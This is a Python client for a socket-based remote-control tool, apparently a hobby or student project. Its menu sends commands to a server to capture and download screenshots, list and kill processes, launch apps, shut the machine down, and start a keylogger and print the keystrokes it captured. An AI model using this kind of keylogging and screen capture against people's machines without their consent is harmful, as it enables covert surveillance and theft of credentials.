import socket
import os
import time

# Commands
CMD_SHUTDOWN = 'shutdown'
CMD_TAKE_SCREENSHOT = 'screenshot'
CMD_KEY_LOGGER = 'keylogger'
CMD_VIEW_PROCESSES = 'view_processes'
CMD_KILL_PROCESS = 'kill_process'
CMD_START_KEYLOGGER = 'start_keylogger'
CMD_STOP_KEYLOGGER = 'stop_keylogger'
CMD_PRINT_KEYLOGGER = 'print_keylogger'
CMD_VIEW_APPS = 'view_apps'
CMD_START_APP = 'start_app'

# FLAGS
FLAG_FILE_END = 'FILE_END'
FLAG_PROCESSES_END = 'PROCESSES_END'
FLAG_APPS_END = 'APPS_END'

# BUFFER
BUFFER_SIZE = 1024

# SCREENSHOT
TMP_PATH = os.path.join(os.getcwd(), 'tmp')


class Client:
  def __init__(self):
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.host = ''
    self.port = 0
    self.addr = (self.host, self.port)

  def connect(self):
    self.host = input('Enter host: ')
    self.port = int(input('Enter port: '))
    self.addr = (self.host, self.port)
    is_disconnected = True
    print("[CONNECTING] Connecting to server...")
    while is_disconnected:
      try:
        self.socket.connect(self.addr)
        # self.client.settimeout(None)
        is_disconnected = False
        print("[SUCCESS] Connected to server")
      except TimeoutError:
          print("[ERROR] Connection timeout")
          exit()
      except ConnectionRefusedError:
          pass
      except ConnectionAbortedError:
          pass

  def run(self):
    while True:
      print('''Commands: 
      1: Take screenshot
      2: View processes
      3: View apps
      4: Kill process/app
      5: Start app
      6: Start process
      7: Start key logger
      8: Stop key logger
      9: Print key logger
      10: Shutdown
      0: Exit''')
      cmd = input('Enter command: ')
      try:
        if cmd == '1':
          self.take_screenshot()
          self.receive_file(TMP_PATH, 'screenshot.png')
        elif cmd == '2':
          self.view_processes()
        elif cmd == '3':
          self.view_apps()
        elif cmd == '4':
          pid = input('Enter pid: ')
          self.kill_process(pid)
        elif cmd == '5':
          app_name = input('Enter app name: ')
          self.start_app(app_name)
        elif cmd == '6':
          pass
        elif cmd == '7':
          self.start_keylogger()
        elif cmd == '8':
          self.stop_keylogger()
        elif cmd == '9':
          self.print_keylogger()
        elif cmd == '10':
          self.shutdown()
          break
        elif cmd == '0':
          print("[EXIT] Exiting...")
          break
      except ConnectionResetError:
        print("[ERROR] Connection reset")
        exit()

  def shutdown(self):
    self.socket.send(CMD_SHUTDOWN.encode())
    print("[SHUTDOWN] Disconnected from server")

  def take_screenshot(self):
    self.socket.send(CMD_TAKE_SCREENSHOT.encode())

  def receive_file(self, path, file_name):
    with open(os.path.join(path, file_name), 'wb') as f:
      while True:
        data = self.socket.recv(BUFFER_SIZE)
        if data == FLAG_FILE_END.encode():
          break
        else:
          f.write(data)

  def start_keylogger(self):
    self.socket.send(CMD_START_KEYLOGGER.encode())

  def stop_keylogger(self):
    self.socket.send(CMD_STOP_KEYLOGGER.encode())

  def print_keylogger(self):
    self.socket.send(CMD_PRINT_KEYLOGGER.encode())
    keys = ""
    while True:
      data = self.socket.recv(BUFFER_SIZE)
      if data == FLAG_FILE_END.encode():
        break
      else:
        keys += data.decode()
    print(keys)

  def view_processes(self):
    self.socket.send(CMD_VIEW_PROCESSES.encode())
    processes = ""
    while True:
      data = self.socket.recv(BUFFER_SIZE)
      if data == FLAG_PROCESSES_END.encode():
        break
      else:
        processes += data.decode()
        
    print(processes)
      
  def kill_process(self, pid):
    self.socket.send(CMD_KILL_PROCESS.encode())
    time.sleep(0.01)
    self.socket.send(str(pid).encode())
  
  def view_apps(self):
    self.socket.send(CMD_VIEW_APPS.encode())
    apps = ""
    while True:
      data = self.socket.recv(BUFFER_SIZE)
      if data == FLAG_APPS_END.encode():
        break
      else:
        apps += data.decode()
    print(apps)

  def start_app(self, app_name):
    self.socket.send(CMD_START_APP.encode())
    time.sleep(0.01)
    self.socket.send(app_name.encode())
    


